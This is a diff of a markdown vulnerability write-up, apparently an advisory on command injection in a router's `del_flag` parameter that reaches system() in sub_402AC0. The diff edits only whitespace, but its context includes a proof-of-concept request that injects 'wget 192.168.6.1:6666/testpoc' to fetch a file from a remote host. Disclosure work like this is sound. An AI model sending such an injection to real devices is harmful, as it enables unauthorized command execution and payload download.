@@ -25,7 +25,7 @@ the value of the `del_flag`  is inserted into `v6`  using `sprintf`,and the valu
 
 <div  align="center"><img src="./img/sub_401770.png" style="zoom:80%;" /></div>
 
-Finally,the command will be executed by  system() in sub_402AC0
+Finally,the command will be executed by  system() in sub_402AC0 
 
 <div  align="center"><img src="./img/sub_402AC0.png" style="zoom:80%;" /></div>
 
@@ -52,4 +52,5 @@ firewall=singlePortForwardDelete&del_flag=0;wget 192.168.6.1:6666/testpoc
 ```
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
